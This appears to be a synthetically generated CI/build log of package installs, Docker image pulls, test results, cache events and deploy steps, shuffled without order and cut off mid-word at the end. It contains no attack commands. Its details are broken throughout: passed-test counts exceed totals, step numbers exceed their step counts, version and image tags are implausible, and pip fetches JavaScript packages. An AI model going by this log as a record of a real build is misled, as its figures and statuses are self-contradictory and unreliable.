DEPRECATION: Feature will be removed in v3.0\nStep 3/25: Testing\n[12:46:06] DEBUG: Memory usage: 1154MB\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 288 passed, 291 total\n\u2713 All checks passed\nCache hit for key-5245\n\u2717 build failed with exit code 46\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:06] INFO: Connecting to database\nnpm install: added 233 packages\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\nStep 5/25: Testing\nInstalling prettier@4.11.5\nFetching submodules...\nSuccess!\nLoading...\nTests: 413 passed, 176 total\nAlready up to date.\nTransforming 609 files...\nAlready up to date.\nTime: 66.778s\nStep 18/17: Testing\nOptimizing 17 modules...\n[12:46:06] WARN: Deprecated API usage\nHEAD is now at e1da5fa\nFetching submodules...\nCache invalidated: dependencies\nCache hit for key-7858\nGET /status - 204 (61ms)\nTests: 494 passed, 56 total\nStep 5/24: Installing dependencies\n[12:46:06] INFO: Starting build process\n[12:46:06] INFO: Cache refreshed\nAlready up to date.\n[12:46:06] DEBUG: Memory usage: 294MB\nStep 13/23: Running migrations\n[12:46:06] DEBUG: Loading configuration\nStep 18/16: Running migrations\n\u2713 test completed\nUploading artifact 'dist' (14 files)\nException: TypeError\nCompleted.\nStep 2/22: Installing dependencies\n[12:46:06] WARN: Deprecated API usage\nStep 13/22: Running migrations\nStep 14/19: Building\nPlatform: darwin-arm64\n[12:46:06] DEBUG: Connection pool: 15 active\nTime: 70.387s\nnpm install: resolved 554 packages\nCache hit for key-1534\nPushing to registry...\nOptimizing 68 modules...\nWARNING: webpack has known vulnerabilities\nHEAD is now at 86109be\nyarn add: Done in 4.36s\n[12:46:06] DEBUG: Memory usage: 1835MB\nCoverage: 95% statements, 81% branches\n[12:46:06] DEBUG: Loading configuration\nnpm install: resolved 659 packages\nPushing to registry...\nUploading artifact 'dist' (9 files)\n[12:46:06] DEBUG: Loading configuration\n[12:46:06] INFO: Processing request\nHEAD is now at 7e03736\n[12:46:06] DEBUG: Connection pool: 12 active\nLayer 1/12: RUN command\nDone.\nnpm install: added 17 packages\nyarn add: Done in 2.57s\nCompiling src/main.py...\nFinished.\nWARNING: express has known vulnerabilities\nReady.\n[12:46:06] INFO: Processing request\nCompiling src/utils.go...\nPulling image: node:3.11\nCoverage: 92% statements, 86% branches\n[12:46:06] INFO: Connecting to database\n[12:46:06] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\nAlready up to date.\nVerifying...\nReady.\nPlatform: win32-x64\nAlready up to date.\nChecking out main branch\nStep 16/17: Installing dependencies\nCoverage: 86% statements, 79% branches\nOptimizing 23 modules...\nTests: 234 passed, 181 total\nCompiling utils/service.java...\nUsing Node.js 15.7.1\n[12:46:06] INFO: Processing request\npip: Downloading webpack-3.19.tar.gz\nOptimizing 40 modules...\npip: Installing build dependencies...\nWARNING: lodash has known vulnerabilities\nFAILED: test_db_connect\n=== Step deploy_production completed ===\n=== Step: save_cache ===\nPulling image: alpine:18\n[12:46:06] INFO: Processing request\nCoverage: 86% statements, 99% branches\n[12:46:06] INFO: Processing request\nArtifact downloaded: 7MB\n[12:46:06] INFO: Request completed\nInstalling jest@2.2.8\n\u2713 All checks passed\nMinifying vendor.js\n[12:46:06] DEBUG: Initializing service\n\u2713 Step 'build' succeeded\nRan 73 tests in 55s\nArtifact uploaded: build.tar.gz (49MB)\nOK\nFetching from https://githubusercontent.com/package.json\nInstalling lodash@1.13.3\n[12:46:06] DEBUG: Connection pool: 19 active\nCompleted.\n[12:46:06] WARN: Deprecated API usage\nyarn add: Done in 29.25s\n[12:46:06] DEBUG: Query executed in 82ms\nPOST /upload - 202 (432ms)\nTLS handshake completed\nMinifying main.js\nCoverage: 81% statements, 97% branches\nStep 2/17: Testing\nCreating production build...\n  PASS: integration/test_auth_login.spec.js\nPulling image: python:18\nTLS handshake completed\nArtifact uploaded: dist.zip (68MB)\nWaiting...\nnpm notice: package.json updated\npip: Collecting eslint\nLayer 4/13: COPY command\n\u2717 build failed with exit code 50\nChecking out develop branch\nImage pulled successfully\nBuilding Docker image...\n\u2713 All checks passed\nRan 199 tests in 41s\nArtifact uploaded: build.tar.gz (7MB)\nOptimizing 12 modules...\n[12:46:06] DEBUG: Connection pool: 8 active\n[12:46:06] INFO: Request completed\nBundling styles.css\nPOST /data - 202 (186ms)\nOptimizing 89 modules...\nEnvironment: development\nWARNING: prettier has known vulnerabilities\nPulling image: alpine:18\nVerifying...\npip install: Successfully installed webpack-1.15\nBuilding Docker image...\n\u2717 build failed with exit code 76\nCache saved successfully\nConnection established\n\u2713 All checks passed\nCoverage: 91% statements, 80% branches\nPOST /data - 201 (155ms)\nWaiting...\nImage pulled successfully\nSnapshots: 19 passed, 43 total\nPOST /data - 201 (334ms)\nnpm notice: created a lockfile\nCache invalidated: build\nUploading artifact 'build' (32 files)\nnpm notice: created a lockfile\nTime: 120.905s\nCache restored successfully (228MB)\n[12:46:06] DEBUG: Memory usage: 1842MB\nFinished.\nBuilding Docker image...\nCompiling components/service.java...\nArtifact uploaded: dist.zip (39MB)\nnpm notice: package.json updated\n[12:46:06] INFO: Processing request\n[12:46:06] DEBUG: Memory usage: 1633MB\nUsing Python 3.9\nNODE_ENV=test\nTests: 463 passed, 129 total\nPOST /upload - 200 (88ms)\nBuilding Docker image...\n[12:46:06] DEBUG: Initializing service\nAlready up to date.\n\u2713 Task completed in 2753ms\nTests: 423 passed, 329 total\nPOST /data - 200 (256ms)\nProcessing...\nBundling runtime.js\nTransforming 409 files...\nStep 3/21: Linting\npip: Downloading express-4.19.tar.gz\nLayer 6/15: ENV command\n[12:46:06] ERROR: Connection failed\nTransforming 850 files...\npip: Collecting jest\nWARNING: jest has known vulnerabilities\nFAILED: test_user_create\nCache hit for key-9084\n[12:46:06] DEBUG: Query executed in 68ms\nWARNING: express has known vulnerabilities\nnpm install: added 209 packages\nCompiling lib/handler.rs...\nDone.\npip install: Successfully installed lodash-1.1\nWARNING: prettier has known vulnerabilities\nSnapshots: 27 passed, 4 total\n[12:46:06] WARN: Deprecated API usage\n[12:46:06] DEBUG: Memory usage: 1017MB\n\u2713 All checks passed\nStep 10/22: Deploying\nUsing Python 3.9\nOptimizing 62 modules...\nCache invalidated: node_modules\n\u2717 build failed with exit code 3\nWARNING: prettier has known vulnerabilities\n  PASS: integration/test_user_create.spec.js\nGET /health - 200 (5ms)\nyarn add: Done in 8.7s\nCompleted.\nStep 15/20: Deploying\nWARNING: lodash has known vulnerabilities\nVerifying...\nBuilding Docker image...\nSuccess!\nPOST /upload - 201 (214ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:06] DEBUG: Query executed in 40ms\nGenerating source maps...\nyarn add: Done in 23.27s\nNODE_ENV=test\n[12:46:06] WARN: Deprecated API usage\nRan 29 tests in 3s\npip: Collecting express\nWARNING: webpack has known vulnerabilities\nStep 3/18: Installing dependencies\nStep 4/22: Building\n\u2717 build failed with exit code 50\nBundling runtime.css\nCache invalidated: build\nOK\nReady.\n[12:46:06] DEBUG: Initializing service\nSnapshots: 11 passed, 35 total\n[12:46:06] WARN: Deprecated API usage\nMinifying vendor.js\nArtifact downloaded: 45MB\nBundling vendor.css\nImage pulled successfully\nnpm notice: package.json updated\n[12:46:06] DEBUG: Query executed in 71ms\nImage pulled successfully\nCompiling src/app.ts...\nCompiling src/app.ts...\n\u2713 All checks passed\nWARNING: axios has known vulnerabilities\nPulling image: alpine:18\nTLS handshake completed\n[12:46:06] DEBUG: Initializing service\n=== Step save_cache completed ===\n=== Step: build ===\nnpm notice: created a lockfile\npip: Collecting prettier\nCache restored successfully (443MB)\nGenerating source maps...\nImage pulled successfully\nStep 2/19: Deploying\nEnvironment: staging\nStep 6/16: Deploying\nCache hit for key-8502\nReady.\nLayer 4/10: ENV command\n[12:46:06] DEBUG: Query executed in 54ms\n[12:46:06] INFO: Cache refreshed\nTime: 100.270s\nnpm install: added 120 packages\n[12:46:06] DEBUG: Connection pool: 16 active\npip: Collecting jest\n[12:46:06] INFO: Processing request\n\u2713 deploy completed\nFAILED: test_api_health\n[12:46:06] DEBUG: Query executed in 37ms\nCache hit for key-9019\nnpm install: resolved 1924 packages\nSwitched to branch 'bugfix/task-240'\nCache miss for key-4150\nException: ValueError\n  PASS: e2e/test_auth_login.spec.js\n\u2713 Step 'test' succeeded\nPulling image: alpine:18\nConnection established\nProcessing...\nChecking out develop branch\npip: Collecting webpack\nFetching submodules...\nStep 7/25: Installing dependencies\nSwitched to branch 'hotfix/task-945'\nGenerating source maps...\nBundling styles.js\nTests: 256 passed, 495 total\nUploading artifact 'coverage' (32 files)\nHEAD is now at 6eed82b\n[12:46:06] INFO: Cache refreshed\nLoading...\n  PASS: integration/test_user_create.spec.js\n[12:46:06] INFO: Cache refreshed\nWARNING: express has known vulnerabilities\n[12:46:06] DEBUG: Loading configuration\n[12:46:06] INFO: Starting build process\nFetching submodules...\nPushing to registry...\nPushing to registry...\nnpm install: resolved 937 packages\nFinished.\nStep 8/23: Building\nnpm notice: package.json updated\nStep 5/18: Deploying\nCache miss for key-8776\nWARNING: prettier has known vulnerabilities\nUsing Node.js 20.15.5\nTime: 103.743s\nPulling image: python:18\n[12:46:06] INFO: Request completed\nLoading...\nGET /health - 201 (26ms)\nLoading...\nSwitched to branch 'bugfix/task-116'\nPOST /upload - 202 (265ms)\nnpm install: resolved 854 packages\nArtifact downloaded: 44MB\npip: Collecting react\nArtifact uploaded: build.tar.gz (33MB)\nyarn add: Done in 15.53s\n[12:46:06] DEBUG: Initializing service\nTest Suites: 18 passed, 34 total\nCompleted.\nArtifact uploaded: build.tar.gz (14MB)\nTests: 478 passed, 98 total\nTLS handshake completed\nCreating production build...\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nInstalling prettier@2.4.4\nSwitched to branch 'bugfix/task-846'\nFAILED: test_user_create\nPlatform: linux-x64\nPlatform: darwin-arm64\npip: Installing build dependencies...\nWARNING: react has known vulnerabilities\nImage pulled successfully\n[12:46:06] DEBUG: Loading configuration\nVerifying...\npip: Collecting webpack\nSnapshots: 19 passed, 45 total\nLayer 10/15: COPY command\n\u2713 Step 'setup' succeeded\nInstalling express@3.6.9\nSnapshots: 40 passed, 29 total\nEnvironment: test\nFAILED: test_user_create\n  PASS: unit/test_auth_login.spec.js\nWaiting...\nTest Suites: 13 passed, 48 total\nnpm notice: package.json updated\nFetching from https://gcr.io/package.json\n[12:46:06] INFO: Processing request\nCompiling utils/utils.go...\nImage pulled successfully\nTLS handshake completed\nFetching from https://gcr.io/package.json\nVerifying...\n[12:46:06] DEBUG: Memory usage: 969MB\n[12:46:06] INFO: Connecting to database\npip: Collecting eslint\n  PASS: test_auth_login (20ms)\nConnection established\nRan 136 tests in 24s\nTLS handshake completed\n\u2713 Task completed in 1174ms\nCache miss for key-5309\nStep 9/21: Running migrations\nVerifying...\n[12:46:06] DEBUG: Connection pool: 5 active\nCompiling lib/service.java...\nStep 7/24: Installing dependencies\nUsing Node.js 16.13.7\nArtifact uploaded: build.tar.gz (46MB)\nOptimizing 34 modules...\nCompiling lib/app.ts...\n[12:46:06] INFO: Cache refreshed\nOK\n[12:46:06] WARN: Deprecated API usage\nMinifying app.js\n[12:46:06] INFO: Request completed\nAlready up to date.\n\u2713 lint completed\nException: ValueError\nUsing Node.js 16.0.10\nCompiling lib/main.py...\nStep 11/23: Installing dependencies\nUsing Python 3.10\nyarn add: Done in 23.18s\nCache miss for key-3663\n  PASS: test_user_create (259ms)\nDone.\n\u2713 package completed\nPlatform: linux-x64\nConnection established\nPlatform: linux-x64\nNODE_ENV=production\n[12:46:06] INFO: Starting build process\nCreating production build...\nCache saved successfully\nInstalling react@5.11.3\nCompiling components/utils.go...\nCache restored successfully (270MB)\nMinifying main.js\nStep 8/16: Deploying\n\u2717 build failed with exit code 36\nStep 13/17: Installing dependencies\n=== Step build completed ===\n=== Step: unit_tests ===\n  PASS: test_auth_login (491ms)\nTest Suites: 10 passed, 14 total\nUsing Python 3.9\n\u2713 All checks passed\n  PASS: integration/test_auth_login.spec.js\nCache restored successfully (457MB)\nCache miss for key-3744\n[12:46:06] ERROR: Connection failed\n  PASS: unit/test_auth_login.spec.js\n[12:46:06] DEBUG: Connection pool: 11 active\nyarn add: Done in 7.64s\nEnvironment: development\nArtifact uploaded: dist.zip (32MB)\n[12:46:06] DEBUG: Loading configuration\nFAILED: test_api_health\nStep 8/25: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:06] INFO: Request completed\nProcessing...\nStep 18/17: Deploying\nCompiling components/app.ts...\nTransforming 250 files...\nReady.\n[12:46:06] DEBUG: Loading configuration\nSuccess!\nyarn add: Done in 5.49s\npip: Downloading webpack-5.5.tar.gz\nyarn add: Done in 23.28s\nPOST /upload - 200 (283ms)\nnpm notice: created a lockfile\n[12:46:06] INFO: Connecting to database\n[12:46:06] DEBUG: Initializing service\n[12:46:06] DEBUG: Memory usage: 1956MB\nCompiling components/main.py...\nProcessing...\n[12:46:06] WARN: Deprecated API usage\nInstalling prettier@3.2.10\nStep 3/19: Testing\nStep 13/22: Building\n[12:46:06] ERROR: Connection failed\nStep 15/19: Testing\nUploading artifact 'dist' (4 files)\nyarn add: Done in 19.78s\nLayer 6/11: ENV command\n[12:46:06] INFO: Starting build process\n[12:46:06] INFO: Connecting to database\nSuccess!\n[12:46:06] INFO: Cache refreshed\nProcessing...\nCompleted.\n\u2717 build failed with exit code 46\nProcessing...\nCreating production build...\nImage pulled successfully\nnpm install: resolved 877 packages\nArtifact uploaded: build.tar.gz (46MB)\nLayer 6/11: RUN command\nChecking out main branch\nCompleted.\nVerifying...\nCache restored successfully (490MB)\n\u2713 Step 'build' succeeded\npip: Collecting webpack\nnpm install: added 274 packages\nnpm notice: package.json updated\n\u2713 lint completed\nOptimizing 32 modules...\n[12:46:06] DEBUG: Loading configuration\nOK\nReady.\nStep 19/21: Installing dependencies\nyarn add: Done in 1.83s\n  PASS: test_cache_hit (24ms)\nCompleted.\n[12:46:06] DEBUG: Loading configuration\n[12:46:06] INFO: Request completed\npip: Downloading react-1.10.tar.gz\npip: Downloading eslint-3.13.tar.gz\nCompiling utils/index.js...\n[12:46:06] ERROR: Connection failed\nStep 19/22: Linting\nWARNING: prettier has known vulnerabilities\nCompiling components/app.ts...\nInstalling eslint@1.1.10\nFetching submodules...\n[12:46:06] DEBUG: Loading configuration\nFAILED: test_user_create\n\u2713 Step 'setup' succeeded\n[12:46:06] DEBUG: Initializing service\nCompleted.\nEnvironment: staging\n\u2713 lint completed\nCompiling utils/utils.go...\nWARNING: jest has known vulnerabilities\nWaiting...\nCache hit for key-3346\n[12:46:06] INFO: Starting build process\nUsing Python 3.12\npip install: Successfully installed eslint-5.20\nConnection established\nCreating production build...\nTransforming 271 files...\nInstalling axios@4.2.6\n[12:46:06] WARN: Deprecated API usage\nStep 15/16: Running migrations\nProcessing...\n\u2713 test completed\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\nTest Suites: 35 passed, 44 total\npip install: Successfully installed jest-2.2\nInstalling axios@2.1.1\nCache invalidated: node_modules\n[12:46:06] DEBUG: Query executed in 91ms\nDone.\nChecking out master branch\n\u2713 deploy completed\nCoverage: 85% statements, 62% branches\nPulling image: node:18\n[12:46:06] DEBUG: Initializing service\nnpm install: added 114 packages\nCompiling lib/index.js...\nBundling styles.css\nException: TypeError\nGenerating source maps...\nPlatform: win32-x64\nCache saved successfully\nCompiling components/handler.rs...\nLoading...\n\u2713 Step 'test' succeeded\n\u2713 deploy completed\n\u2713 Step 'setup' succeeded\n[12:46:06] DEBUG: Connection pool: 14 active\nVerifying...\npip: Downloading eslint-5.16.tar.gz\nPulling image: alpine:3.11\nWARNING: webpack has known vulnerabilities\nFetching submodules...\nPulling image: python:3.11\nTest Suites: 12 passed, 35 total\nLoading...\nCache saved successfully\nnpm install: added 18 packages\nStep 15/20: Linting\nFAILED: test_api_health\n  PASS: unit/test_api_health.spec.js\n[12:46:06] INFO: Request completed\nTime: 14.625s\nLoading...\n[12:46:06] WARN: Deprecated API usage\nPulling image: python:18\npip: Collecting jest\nCache saved successfully\nCompleted.\nException: NullPointerException\n\u2713 Task completed in 3661ms\nLayer 2/8: RUN command\n[12:46:06] ERROR: Connection failed\nnpm notice: created a lockfile\n=== Step unit_tests completed ===\n=== Step: lint ===\npip: Installing build dependencies...\nTime: 55.722s\n[12:46:06] DEBUG: Memory usage: 313MB\nCache saved successfully\nTransforming 741 files...\nWARNING: jest has known vulnerabilities\nDone.\nFAILED: test_db_connect\nWARNING: prettier has known vulnerabilities\n\u2713 build completed\nCompiling lib/index.js...\nCompiling components/handler.rs...\nLoading...\n[12:46:06] DEBUG: Connection pool: 14 active\nWARNING: axios has known vulnerabilities\n[12:46:06] INFO: Processing request\nLoading...\n[12:46:06] ERROR: Connection failed\nCache hit for key-9465\nCompiling lib/main.py...\n[12:46:06] DEBUG: Initializing service\nCompiling lib/app.ts...\nAlready up to date.\nVerifying...\nVerifying...\nPushing to registry...\nyarn add: Done in 22.84s\nCompiling utils/service.java...\nWARNING: react has known vulnerabilities\nConnection established\nCompiling src/main.py...\nSwitched to branch 'bugfix/task-209'\n[12:46:06] INFO: Cache refreshed\nBundling main.css\nException: ValueError\nUploading artifact 'dist' (8 files)\n[12:46:06] INFO: Cache refreshed\nCompleted.\nTransforming 853 files...\nConnection established\nCompiling utils/index.js...\nTests: 307 passed, 163 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed lodash-4.15\nUploading artifact 'dist' (17 files)\nStep 3/23: Building\nPOST /api - 202 (307ms)\npip install: Successfully installed react-2.8\nnpm install: resolved 915 packages\nSwitched to branch 'feature/task-104'\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 16 passed, 14 total\n  PASS: unit/test_db_connect.spec.js\nLoading...\n\u2717 build failed with exit code 23\nUploading artifact 'build' (19 files)\nSnapshots: 29 passed, 8 total\nHEAD is now at 1c5f5c7\nCache invalidated: node_modules\nWaiting...\nProcessing...\nBundling styles.js\n[12:46:06] WARN: Deprecated API usage\nBundling vendor.js\nUsing Python 3.9\nArtifact downloaded: 30MB\nGET /api - 201 (80ms)\nUsing Python 3.12\nSnapshots: 11 passed, 33 total\nCache saved successfully\nUploading artifact 'dist' (1 files)\nWARNING: webpack has known vulnerabilities\nNODE_ENV=production\nTime: 18.998s\n  PASS: e2e/test_auth_login.spec.js\nArtifact uploaded: dist.zip (22MB)\nCache invalidated: dependencies\n\u2713 All checks passed\nNODE_ENV=development\nRan 190 tests in 23s\nSuccess!\nTransforming 425 files...\nCache restored successfully (17MB)\n[12:46:06] INFO: Starting build process\nCompiling lib/handler.rs...\n\u2713 Step 'checkout' succeeded\n[12:46:06] DEBUG: Loading configuration\nnpm install: resolved 1855 packages\n\u2713 deploy completed\nDone.\nnpm install: added 145 packages\npip: Downloading eslint-5.6.tar.gz\nWARNING: prettier has known vulnerabilities\nOK\nTests: 481 passed, 99 total\nTests: 86 passed, 498 total\npip: Installing build dependencies...\nnpm notice: created a lockfile\nCompiling lib/service.java...\nCache invalidated: dependencies\nUploading artifact 'dist' (47 files)\nStep 7/15: Linting\npip: Downloading express-3.6.tar.gz\nArtifact downloaded: 21MB\nnpm install: added 222 packages\nException: TypeError\nCompiling lib/app.ts...\nTests: 337 passed, 327 total\nWARNING: express has known vulnerabilities\n[12:46:06] WARN: Deprecated API usage\nnpm install: resolved 584 packages\nPulling image: python:18\nWaiting...\nCoverage: 100% statements, 70% branches\n[12:46:06] DEBUG: Memory usage: 444MB\nCompiling utils/app.ts...\nStep 14/15: Deploying\nGET /health - 201 (23ms)\nCache saved successfully\n[12:46:06] INFO: Starting build process\nGET /health - 204 (31ms)\nNODE_ENV=test\nyarn add: Done in 2.27s\nVerifying...\nCache restored successfully (479MB)\nInstalling react@5.2.0\n\u2713 Step 'checkout' succeeded\nOptimizing 29 modules...\nBundling styles.js\nProcessing...\nUsing Python 3.11\nFetching from https://docker.io/package.json\nnpm install: resolved 1464 packages\nCache miss for key-2591\n  PASS: e2e/test_api_health.spec.js\nPulling image: alpine:3.11\nyarn add: Done in 18.96s\nCompleted.\n[12:46:06] DEBUG: Memory usage: 138MB\n[12:46:06] INFO: Request completed\nCache invalidated: dependencies\n\u2713 All checks passed\n\u2713 test completed\nnpm install: resolved 1258 packages\n  PASS: integration/test_auth_login.spec.js\nCache miss for key-2778\nnpm notice: package.json updated\nCompiling utils/service.java...\n  PASS: test_user_create (432ms)\nOptimizing 20 modules...\nFetching submodules...\npip install: Successfully installed react-3.1\nStep 5/18: Deploying\nPushing to registry...\nStep 4/15: Building\nFetching from https://githubusercontent.com/package.json\nStep 4/19: Testing\n\u2713 test completed\nStep 9/21: Building\n=== Step lint completed ===\n=== Step: setup_node ===\nCompiling components/utils.go...\n[12:46:06] WARN: Deprecated API usage\nFetching from https://amazonaws.com/package.json\nStep 4/19: Testing\nOptimizing 64 modules...\n\u2713 Task completed in 736ms\nCache saved successfully\n[12:46:06] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (45MB)\nSuccess!\nCache hit for key-8081\nLayer 1/8: COPY command\nRan 41 tests in 9s\npip install: Successfully installed jest-1.15\nnpm notice: package.json updated\nGenerating source maps...\nFAILED: test_api_health\nStep 2/21: Deploying\nLoading...\n  PASS: test_api_health (160ms)\n\u2713 All checks passed\nGET /health - 200 (7ms)\n[12:46:06] INFO: Request completed\nTime: 39.610s\nSwitched to branch 'hotfix/task-482'\nFetching from https://pypi.org/package.json\nCache hit for key-3442\nConnection established\n\u2713 All checks passed\n[12:46:06] INFO: Processing request\n\u2717 build failed with exit code 9\nVerifying...\nGET /health - 201 (31ms)\nLayer 7/11: COPY command\nRan 19 tests in 55s\nStep 9/18: Installing dependencies\nFetching submodules...\n[12:46:06] WARN: Deprecated API usage\nOK\nCompiling utils/handler.rs...\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: build\nyarn add: Done in 12.83s\nCompleted.\n[12:46:06] ERROR: Connection failed\nFAILED: test_auth_login\n[12:46:06] DEBUG: Loading configuration\nnpm notice: created a lockfile\nEnvironment: test\nHEAD is now at 7770d64\nUsing Node.js 14.16.4\n[12:46:06] DEBUG: Connection pool: 5 active\nCoverage: 70% statements, 86% branches\nPlatform: win32-x64\nTest Suites: 16 passed, 10 total\nStep 20/17: Testing\nArtifact uploaded: build.tar.gz (7MB)\n[12:46:06] DEBUG: Connection pool: 11 active\nUploading artifact 'dist' (10 files)\nUsing Python 3.12\nPushing to registry...\npip: Collecting jest\n[12:46:06] INFO: Starting build process\n\u2717 build failed with exit code 54\nHEAD is now at b5a67f6\nOK\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nyarn add: Done in 10.42s\nLayer 3/13: ENV command\nStep 1/16: Linting\npip: Downloading webpack-2.2.tar.gz\n[12:46:06] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Python 3.10\n  PASS: test_cache_hit (407ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nRan 89 tests in 11s\nUsing Node.js 20.3.3\nCache restored successfully (325MB)\nWaiting...\n  PASS: test_db_connect (26ms)\nTime: 2.70s\nLayer 1/12: ENV command\nPOST /api - 201 (27ms)\n[12:46:06] INFO: Starting build process\nArtifact uploaded: dist.zip (70MB)\nSuccess!\n[12:46:06] INFO: Request completed\nStep 12/20: Deploying\nUsing Node.js 19.20.8\nnpm install: resolved 364 packages\nSwitched to branch 'feature/task-545'\npip: Downloading react-1.17.tar.gz\n[12:46:06] DEBUG: Memory usage: 1969MB\npip: Downloading prettier-5.14.tar.gz\nCompiling components/service.java...\n[12:46:06] WARN: Deprecated API usage\n\u2713 Task completed in 564ms\nOptimizing 51 modules...\nnpm notice: created a lockfile\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\nnpm install: added 81 packages\nLoading...\nnpm install: added 492 packages\nUsing Node.js 17.11.8\n[12:46:06] INFO: Connecting to database\nBundling main.css\nStep 1/25: Testing\nRan 116 tests in 29s\nFetching from https://gcr.io/package.json\nCache hit for key-8200\nImage pulled successfully\nStep 7/25: Running migrations\nTime: 25.352s\n[12:46:06] INFO: Cache refreshed\nLayer 10/10: ENV command\n\u2713 lint completed\n[12:46:06] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (28MB)\nStep 13/22: Testing\nArtifact uploaded: build.tar.gz (4MB)\nImage pulled successfully\nProcessing...\nWaiting...\nStep 7/21: Running migrations\nVerifying...\n[12:46:06] WARN: Deprecated API usage\npip: Collecting webpack\nRan 27 tests in 54s\nFetching from https://npmjs.org/package.json\nTransforming 702 files...\nPulling image: alpine:18\nOK\n[12:46:06] DEBUG: Loading configuration\n\u2713 All checks passed\nEnvironment: staging\nnpm notice: created a lockfile\nRan 76 tests in 50s\nOK\npip: Downloading express-5.11.tar.gz\nPlatform: darwin-arm64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\n\u2713 validate completed\nChecking out master branch\n  PASS: test_db_connect (272ms)\nFetching submodules...\nHEAD is now at f19ad82\nWaiting...\nnpm install: added 404 packages\nnpm notice: created a lockfile\nCache hit for key-8068\nWaiting...\n\u2717 build failed with exit code 45\nTime: 86.47s\nSuccess!\npip: Collecting webpack\n=== Step setup_node completed ===\n=== Step: integration_tests ===\nTests: 173 passed, 434 total\nInstalling eslint@2.14.4\n  PASS: e2e/test_auth_login.spec.js\nTest Suites: 14 passed, 28 total\nCache saved successfully\nSuccess!\nHEAD is now at 24234fe\n[12:46:06] INFO: Connecting to database\n[12:46:06] INFO: Cache refreshed\nEnvironment: production\nCache invalidated: dependencies\nUploading artifact 'build' (17 files)\n[12:46:06] INFO: Connecting to database\nPushing to registry...\nRan 14 tests in 6s\nyarn add: Done in 19.23s\nImage pulled successfully\nFetching from https://registry.npmjs.org/package.json\nGET /api - 201 (54ms)\nLoading...\nFetching from https://gcr.io/package.json\n[12:46:06] DEBUG: Query executed in 47ms\nnpm install: added 134 packages\nArtifact uploaded: build.tar.gz (33MB)\n[12:46:06] ERROR: Connection failed\n[12:46:06] DEBUG: Connection pool: 15 active\n[12:46:06] DEBUG: Query executed in 16ms\nEnvironment: test\nFetching from https://github.com/package.json\nnpm notice: package.json updated\n\u2713 All checks passed\nCompiling components/app.ts...\n\u2713 All checks passed\nStep 10/18: Installing dependencies\nStep 18/18: Deploying\n[12:46:06] DEBUG: Memory usage: 616MB\nCache saved successfully\nOK\nCompiling lib/index.js...\npip install: Successfully installed lodash-2.10\nTest Suites: 24 passed, 35 total\nAlready up to date.\nTransforming 810 files...\nUsing Python 3.12\nTests: 490 passed, 78 total\nInstalling react@5.0.8\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nAlready up to date.\nnpm notice: package.json updated\nUsing Python 3.12\npip install: Successfully installed lodash-5.15\n[12:46:06] INFO: Cache refreshed\nOK\n[12:46:06] ERROR: Connection failed\nStep 7/19: Running migrations\nAlready up to date.\nWaiting...\nGenerating source maps...\nUsing Python 3.10\nUsing Python 3.9\nPulling image: alpine:18\n[12:46:06] INFO: Connecting to database\nUsing Node.js 15.12.1\nFetching submodules...\nCache restored successfully (310MB)\nConnection established\nCompiling utils/service.java...\nPOST /api - 200 (397ms)\n\u2717 build failed with exit code 40\n\u2713 Task completed in 2847ms\nVerifying...\n[12:46:06] INFO: Request completed\nSwitched to branch 'hotfix/task-403'\nnpm install: added 90 packages\nFetching submodules...\nRan 154 tests in 9s\nDone.\n[12:46:06] INFO: Cache refreshed\nDone.\nPOST /upload - 201 (279ms)\nCache restored successfully (56MB)\nBuilding Docker image...\nSnapshots: 39 passed, 2 total\n[12:46:06] INFO: Processing request\nTLS handshake completed\nDone.\nChecking out master branch\nImage pulled successfully\n  PASS: integration/test_user_create.spec.js\nStep 20/16: Installing dependencies\n[12:46:06] DEBUG: Loading configuration\nUsing Python 3.9\nyarn add: Done in 27.5s\nPlatform: win32-x64\nWARNING: eslint has known vulnerabilities\nStep 16/19: Testing\nFinished.\npip: Downloading eslint-3.5.tar.gz\n\u2713 build completed\nTest Suites: 47 passed, 40 total\nFetching from https://googleapis.com/package.json\n[12:46:06] DEBUG: Memory usage: 487MB\nArtifact uploaded: dist.zip (51MB)\n  PASS: test_user_create (302ms)\n[12:46:06] DEBUG: Loading configuration\n[12:46:06] INFO: Cache refreshed\nTransforming 103 files...\nCache restored successfully (316MB)\nWARNING: express has known vulnerabilities\nPushing to registry...\nCache restored successfully (226MB)\nDone.\n[12:46:06] DEBUG: Loading configuration\nCompiling lib/main.py...\nImage pulled successfully\nFetching submodules...\n[12:46:06] WARN: Deprecated API usage\n  PASS: e2e/test_cache_hit.spec.js\nPOST /data - 201 (238ms)\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: dist.zip (74MB)\n[12:46:06] INFO: Processing request\nPushing to registry...\nPOST /data - 200 (251ms)\nStep 12/25: Deploying\nChecking out main branch\n[12:46:06] INFO: Processing request\nConnection established\nStep 4/18: Installing dependencies\nCache invalidated: node_modules\npip: Installing build dependencies...\nnpm install: resolved 420 packages\nOK\nVerifying...\nLayer 4/13: ENV command\nCache invalidated: dependencies\nnpm install: resolved 1055 packages\n\u2713 validate completed\nWaiting...\n\u2717 build failed with exit code 20\nArtifact uploaded: build.tar.gz (9MB)\nUploading artifact 'build' (40 files)\nnpm notice: created a lockfile\nImage pulled successfully\nCompiling utils/utils.go...\nAlready up to date.\nAlready up to date.\nArtifact 